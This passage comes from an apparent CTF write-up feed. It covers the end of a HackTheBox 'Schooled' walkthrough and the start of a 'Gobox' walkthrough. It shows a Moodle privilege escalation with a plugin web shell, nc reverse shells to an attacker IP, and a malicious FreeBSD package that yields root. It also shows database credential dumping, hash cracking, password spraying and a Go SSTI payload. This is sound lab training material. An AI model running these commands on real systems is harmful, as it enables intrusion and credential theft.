<p><div class="img-container"><img src="imgs/image-20210520013212895.png" alt="image-20210520013212895"  /></div>
</p>
<p>When I refresh the page, I&rsquo;m now logged in as Manuel Phillips.</p>
<p><div class="img-container"><img src="imgs/image-20210915212643838.png" alt="image-20210915212643838"  /></div>
</p>
<p>Now I can confirm that this Moodle version is 3.9 by visiting <code>http://moodle.schooled.htb/moodle/user/view.php?id=24&amp;course=5</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210915213438687.png" alt="image-20210915213438687"  /></div>
</p>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="moodle-cve-2020-14321---teacher-role---manager-role">Moodle CVE-2020-14321 - Teacher role -&gt; Manager role</h4>
<p>The version is known to be vulnerable to the role privilege escalation (<code>CVE-2020-14321</code>) that allows escalation of privilege from teacher role (Manuel Phillips has teacher role) to manager role. With manager role, it is also possible to obtain code execution by installing a malicious plugin. I will be using this <a href="https://vimeo.com/441698193">walkthrough video</a> created by the researcher who found this vulnerability as my reference.</p>
<p>The first step is to join a teacher to my course.</p>
<p><div class="img-container"><img src="imgs/image-20210520022325198.png" alt="image-20210520022325198"  /></div>
</p>
<p>I will choose Jamie Borham and enroll it to my course.</p>
<p><div class="img-container"><img src="imgs/image-20210520022826655.png" alt="image-20210520022826655"  /></div>
</p>
<p>I will intercept the enroll request using Burp Suite and modify the <code>userslist</code> parameter to 24 (UserID of Phillips) then the <code>roletoassign</code> parameter to 1.</p>
<p><div class="img-container"><img src="imgs/image-20210520023902707.png" alt="image-20210520023902707"  /></div>
</p>
<p>On the course participants, I can see the manager role has been assigned to Phillips.</p>
<p><div class="img-container"><img src="imgs/image-20210915214751404.png" alt="image-20210915214751404"  /></div>
</p>
<p>With manager role, I have the ability to impersonate my participants (they have to be on my course first) using &ldquo;Login as&rdquo; function. For example:</p>
<p><div class="img-container"><img src="imgs/image-20210520032135611.png" alt="image-20210520032135611"  /></div>
</p>
<p>When I logged in as Lianne Carter, there is another menu called &ldquo;Site Administration&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210915221840588.png" alt="image-20210915221840588"  /></div>
</p>
<h4 id="malicious-plugin">Malicious Plugin</h4>
<p>Now to get RCE, I need to grant full permissions to manager role (from my understanding, Lianne Carter has site administrative capability and manager role).</p>
<p>I will head to <code>Site Administration</code> -&gt; <code>Users</code> -&gt; <code>Define roles</code> -&gt; <code>Manager</code> -&gt;  <code>Edit</code> to grant full permission to manager role.</p>
<p><div class="img-container"><img src="imgs/image-20210915222952344.png" alt="image-20210915222952344"  /></div>
</p>
<p>Then I will just click on <code>Save changes</code> button and intercept its request.</p>
<p><div class="img-container"><img src="imgs/image-20210915223616445.png" alt="image-20210915223616445"  /></div>
</p>
<p>Except the <code>sesskey</code> parameter, I will change all the parameters with this <a href="https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions">PoC</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210915223955951.png" alt="image-20210915223955951"  /></div>
</p>
<p>Now I can install a malicious plugin by accessing <code>Site Administration</code> -&gt; <code>Plugins</code> -&gt; <code>Install plugins</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210915224410922.png" alt="image-20210915224410922"  /></div>
</p>
<p>I will grab the malicious plugin from this repository: <a href="https://github.com/HoangKien1020/Moodle_RCE">https://github.com/HoangKien1020/Moodle_RCE</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210915225327871.png" alt="image-20210915225327871"  /></div>
</p>
<p>I will just continue on the installation process.</p>
<p><div class="img-container"><img src="imgs/image-20210915230537390.png" alt="image-20210915230537390"  /></div>
</p>
<p>Once the plugin is installed, it can be accessed at <code>http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=[command]</code>:</p>
<p><div class="img-container"><img src="imgs/image-20210520034807810.png" alt="image-20210520034807810"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>Since it&rsquo;s FreeBSD, I will use the mkfifo payload to get a foothold.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol
</code></pre></div><p>On my listener:</p>
<p><div class="img-container"><img src="imgs/image-20210520041503270.png" alt="image-20210520041503270"  /></div>
</p>
<p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/sh&#39;)&#34;</span>
$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
$ which stty
which stty
/bin/stty
$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> suspended  nc -nvlp <span class="m">53</span>
→ root@kali «exploits» «10.10.14.49» 
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> continued  nc -nvlp <span class="m">53</span>

$ ls -l
total <span class="m">0</span>
$ ls -la
total <span class="m">0</span>
$ <span class="nb">pwd</span>
/usr/local/www/apache24/data/moodle/blocks/rce/lang/en
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-jamie">Shell as jamie</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There are two users other than root who have a login shell: <strong>jamie</strong> and <strong>steve</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat /etc/passwd <span class="p">|</span> grep sh$
root:*:0:0:Charlie <span class="p">&amp;</span>:/root:/bin/csh
jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
steve:*:1002:1002:User <span class="p">&amp;</span>:/home/steve:/bin/csh
$ ls -l /home/
total <span class="m">17</span>
drwx------  <span class="m">2</span> jamie  jamie  <span class="m">11</span> Feb <span class="m">28</span> 18:13 jamie
drwx------  <span class="m">5</span> steve  steve  <span class="m">14</span> Mar <span class="m">17</span> 14:05 steve
</code></pre></div><p>The Moodle configuration file is located under <code>/usr/local/www/apache24/data/moodle</code>, and it contains database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat config.php 
&lt;?php  // Moodle configuration file

unset<span class="o">(</span><span class="nv">$CFG</span><span class="o">)</span><span class="p">;</span>
global <span class="nv">$CFG</span><span class="p">;</span>
<span class="nv">$CFG</span> <span class="o">=</span> new stdClass<span class="o">()</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;dbtype    <span class="o">=</span> <span class="s1">&#39;mysqli&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dblibrary <span class="o">=</span> <span class="s1">&#39;native&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbhost    <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbname    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbuser    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbpass    <span class="o">=</span> <span class="s1">&#39;PlaybookMaster2020&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;prefix    <span class="o">=</span> <span class="s1">&#39;mdl_&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dboptions <span class="o">=</span> array <span class="o">(</span>
  <span class="s1">&#39;dbpersist&#39;</span> <span class="o">=</span>&gt; 0,
  <span class="s1">&#39;dbport&#39;</span> <span class="o">=</span>&gt; 3306,
  <span class="s1">&#39;dbsocket&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
  <span class="s1">&#39;dbcollation&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;utf8_unicode_ci&#39;</span>,
<span class="o">)</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;wwwroot   <span class="o">=</span> <span class="s1">&#39;http://moodle.schooled.htb/moodle&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dataroot  <span class="o">=</span> <span class="s1">&#39;/usr/local/www/apache24/moodledata&#39;</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;admin     <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;directorypermissions <span class="o">=</span> 0777<span class="p">;</span>

require_once<span class="o">(</span>__DIR__ . <span class="s1">&#39;/lib/setup.php&#39;</span><span class="o">)</span><span class="p">;</span>

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
</code></pre></div><h4 id="mysql">MySQL</h4>
<p>MySQL binary cannot be resolved, but it&rsquo;s available at <code>/usr/local/bin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/mysql moodle -u moodle -p<span class="s1">&#39;PlaybookMaster2020&#39;</span>
mysql: <span class="o">[</span>Warning<span class="o">]</span> Using a password on the <span class="nb">command</span> line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
Your MySQL connection id is <span class="m">7517</span>
Server version: 8.0.23 Source distribution

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.

moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
</code></pre></div><p>Table <code>mdl_users</code> holds all the Moodle user credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; <span class="k">select</span> username,password from mdl_user<span class="p">;</span>
+-------------------+--------------------------------------------------------------+
<span class="p">|</span> username          <span class="p">|</span> password                                                     <span class="p">|</span>
+-------------------+--------------------------------------------------------------+
<span class="p">|</span> guest             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 <span class="p">|</span>
<span class="p">|</span> admin             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW <span class="p">|</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
<span class="p">|</span> iamf              <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$GTtFW8Rpm8jnLJ1YmpTBy</span>.rmhwTjdWfc9mR6/jC87WtvCK6CgVOXy <span class="p">|</span>
+-------------------+--------------------------------------------------------------+
<span class="m">33</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
</code></pre></div><p>There are a lot of hashes to recover, but I will focus on the admin hash first.</p>
<h4 id="crack-hash">Crack hash</h4>
<p>Hashcat recovers the admin password to <code>!QAZ2wsx</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ hashcat.exe -m <span class="m">3200</span> <span class="s1">&#39;$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:&#39;</span> rockyou.txt

...<span class="o">[</span>SNIP<span class="o">]</span>...
<span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt <span class="nv">$2</span>*$, Blowfish <span class="o">(</span>Unix<span class="o">)</span>
Hash.Target......: <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5G...l4qTiW
Time.Started.....: Thu May <span class="m">20</span> 05:04:20 <span class="m">2021</span> <span class="o">(</span><span class="m">1</span> min, <span class="m">25</span> secs<span class="o">)</span>
Time.Estimated...: Thu May <span class="m">20</span> 05:05:45 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
Guess.Base.......: File <span class="o">(</span>../rockyou.txt<span class="o">)</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="password-spray">Password Spray</h4>
<p>With password spray attack, it reveals that the password is reused by user <strong>jamie</strong> for SSH login.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
$ crackmapexec ssh 10.10.10.234 -u users.list -p passwords.list --continue-on-success
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9 FreeBSD-20200214
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> jamie:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>+<span class="o">]</span> jamie:!QAZ2wsx 
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</code></pre></div><h4 id="ssh">SSH</h4>
<p>Now I can login as jamie via SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «schooled» «10.10.14.49» 
$ ssh jamie@10.10.10.234
Password <span class="k">for</span> jamie@Schooled:
Last login: Tue Mar <span class="m">16</span> 14:44:53 <span class="m">2021</span> from 10.10.14.5
FreeBSD 13.0-BETA3 <span class="o">(</span>GENERIC<span class="o">)</span> <span class="c1">#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021</span>

...<span class="o">[</span>SNIP<span class="o">]</span>...

jamie@Schooled:~ $ id
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span>,0<span class="o">(</span>wheel<span class="o">)</span>
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <strong>jamie</strong> is allowed to run sudo on <code>pkg</code> binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg install *
</code></pre></div><p>According to <a href="https://gtfobins.github.io/gtfobins/pkg/">GTFObins</a>, this can be abused to install malicious FreeBSD package, but <code>fpm </code> has to be <a href="https://github.com/jordansissel/fpm">installed</a> first.</p>
<h4 id="malicious-package">Malicious package</h4>
<p>Using reference from GTFOBins, I can create a malicious package that contains a reverse shell</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">&#39;mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol&#39;</span> &gt; <span class="nv">$TF</span>/x.sh<span class="p">;</span>fpm -n x -s dir -t freebsd -a all --before-install <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use <span class="c1">#finish to prevent that.</span>
/var/lib/gems/2.5.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in <span class="sb">`</span>initialize<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new&#39;</span>
        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in <span class="sb">`</span>block in output<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open&#39;</span>
        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in <span class="sb">`</span>output<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute&#39;</span>
        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in <span class="sb">`</span>run<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run&#39;</span>
        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in <span class="sb">`</span>run<span class="s1">&#39;
</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/bin/fpm:7:in `&lt;top (required)&gt;&#39;</span>
        /usr/local/bin/fpm:23:in <span class="sb">`</span>load<span class="s1">&#39;
</span><span class="s1">        /usr/local/bin/fpm:23:in `&lt;main&gt;&#39;</span>
Created package <span class="o">{</span>:path<span class="o">=</span>&gt;<span class="s2">&#34;x-1.0.txz&#34;</span><span class="o">}</span>
</code></pre></div><p>I will transfer the package to Schooled.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
$ <span class="k">$(</span>bash -c <span class="s1">&#39;cat x-1.0.txz &gt; /dev/tcp/10.10.10.234/9000&#39;</span><span class="k">)</span>
</code></pre></div><blockquote>
<p><code>/dev/tcp/</code> is a feature from Bash. Since my shell is Zsh, so I had to invoke the transfer command within a subshell.</p>
</blockquote>
<p>On Schooled:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ nc -lv <span class="m">9000</span> &gt; x-1.0.txz
Connection from 10.10.14.49 <span class="m">60744</span> received!
</code></pre></div><p>I will setup a Netcat listener on my Kali and start the installation of the package on Schooled.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. <span class="s1">&#39;pkg update&#39;</span> required
Checking integrity... <span class="k">done</span> <span class="o">(</span><span class="m">0</span> conflicting<span class="o">)</span>
The following <span class="m">1</span> package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of <span class="m">0</span> checked<span class="o">)</span>:

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: <span class="m">1</span>
<span class="o">[</span>1/1<span class="o">]</span> Installing x-1.0...
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>And I&rsquo;m rooted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">23093</span>
<span class="c1"># whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; cut -c-15 /root/root.txt</span>
root
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>,5<span class="o">(</span>operator<span class="o">)</span>
Schooled
2462d8e2125d2a0
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://github.com/HoangKien1020/CVE-2020-25627">https://github.com/HoangKien1020/CVE-2020-25627</a></li>
<li><a href="https://github.com/HoangKien1020/CVE-2020-14321">https://github.com/HoangKien1020/CVE-2020-14321</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/pkg/">https://gtfobins.github.io/gtfobins/pkg/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Gobox</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-gobox/</link>
      <pubDate>Sun, 12 Sep 2021 12:33:46 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-gobox/</guid>
      <description>SSTI in Golang, abuse S3 bucket, and NGINX backdoor</description>
      <content:encoded><![CDATA[<p>Gobox is a machine that has previously been used in the Ultimate Hacking Championship (UHC) event. It starts off by enumerating two web applications, one of which is a Go web application and is vulnerable to SSTI. The SSTI is leveraged to leak credentials and these can be used to login into the web app. Upon logging in, the app provides its source code. Examination of the source code reveals a debug mode that allows code execution on the underlying system, which turns out to be a container. Enumeration within the container reveals that it can interact with Amazon S3 (simulated) and has write permission on a bucket, allowing me to drop a web shell to gain a foothold on the host system. Further enumeration on the host discovers an NGINX backdoor which can be leveraged to escalate to root.</p>
<p>In the explore section, I&rsquo;m (trying to) digging into the request routing of this machine.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>Golang SSTI</li>
<li>Source Code Analysis</li>
<li>Scripting</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP scan using <code>nmap</code> discovers three open ports: SSH on port 22, two sites on port 80 and port 8080, which are handled by NGINX.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ fscan 10.10.11.113 gobox
nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.11.113 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
nmap -p 22,80,8080 -sC -sV -oA nmap/10-tcp-allport-gobox 10.10.11.113
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-06 21:30 EDT
Nmap scan report <span class="k">for</span> 10.10.11.113
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span>.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    nginx
<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>
8080/tcp open  http    nginx
<span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
<span class="p">|</span>_http-title: Hacking eSports <span class="p">|</span> Home page
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 30.82 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website-homepage">TCP 80 - Website (Homepage)</h3>
<p>The site on port 80 is a kind of Hacking eSports homepage.</p>
<p><div class="img-container"><img src="imgs/image-20210908091359759.png" alt="image-20210908091359759"  /></div>
</p>
<p>On the address bar, I added <code>index.php</code> and it returned the same page, therefore I can assume it&rsquo;s a PHP site. But, on the title, I noticed a templating syntax that similar to the one used in Golang, so it&rsquo;s weird for me to see that syntax on PHP  (I&rsquo;m familiar with that syntax because this blog based on Go).</p>
<p><div class="img-container"><img src="imgs/image-20210908102851854.png" alt="image-20210908102851854"  /></div>
</p>
<p>Nothing else to see here.</p>
<h3 id="tcp-8080---website-login-page">TCP 8080 - Website (Login page)</h3>
<p>On port 8080, it shows a login page.</p>
<p><div class="img-container"><img src="imgs/image-20210907083526935.png" alt="image-20210907083526935"  /></div>
</p>
<p>When an email and a password is submitted, it outputs nothing.</p>
<p>Poking with <code>curl</code> shows that it has extra HTTP header:  <code>X-Forwarded-Server: golang</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
$ curl -s -I http://10.10.11.113:8080       
HTTP/1.1 <span class="m">200</span> OK
Server: nginx
Date: Tue, <span class="m">07</span> Sep <span class="m">2021</span> 01:38:34 GMT
Connection: keep-alive
X-Forwarded-Server: golang
</code></pre></div><p>The &ldquo;Forgot Password&rdquo; link points to <code>/forgot</code> and it&rsquo;s a password reset feature. If I submit an email address there, for example <code>admin@gobox.htb</code>, it reflects the address under the input box.</p>
<p><div class="img-container"><img src="imgs/image-20210907084427125.png" alt="image-20210907084427125"  /></div>
</p>
<p>The following is how the HTTP request and the HTTP response look like.</p>
<p><div class="img-container"><img src="imgs/image-20210907090528507.png" alt="image-20210907090528507"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="container-root">Container root</h3>
<h4 id="ssti">SSTI</h4>
<p>Seeing a templating syntax and Golang in the HTTP response, I started to search some topics about SSTI in Golang, and then I came across <a href="https://www.onsecurity.io/blog/go-ssti-method-research/">this post</a>. Using that post as reference and assuming that I can access a <a href="https://tour.golang.org/moretypes/2">struct</a> that has email property, I send the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">email={{.Email}}
</code></pre></div><p>And the site is vulnerable to SSTI! It returns an email address: <code>ippsec@hacking.esports</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210907090719892.png" alt="image-20210907090719892"  /></div>
</p>
<p>When <code>{{.}}</code> is submitted, it spits out all the available property values.</p>
<p><div class="img-container"><img src="imgs/image-20210907090804596.png" alt="image-20210907090804596"  /></div>
</p>
<p><code>ippsec@hacking.esports</code>  and <code>ippsSecretPassword</code> can be used to login, and the page returns with a source code written in Go.</p>
<p><div class="img-container"><img src="imgs/image-20210907091141912.png" alt="image-20210907091141912"  /></div>
</p>
<h4 id="rce">RCE</h4>
<p>Examining the source code reveals that there is a function (around line 27) that allows code execution on the underlying system. The function takes one parameter called <code>test</code> and pass it to the <code>exec.Command</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="o">...</span>
<span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="nx">User</span><span class="p">)</span> <span class="nf">DebugCmd</span><span class="p">(</span><span class="nx">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="nx">ipp</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">test</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
	<span class="nx">bin</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">ipp</span><span class="p">[:</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
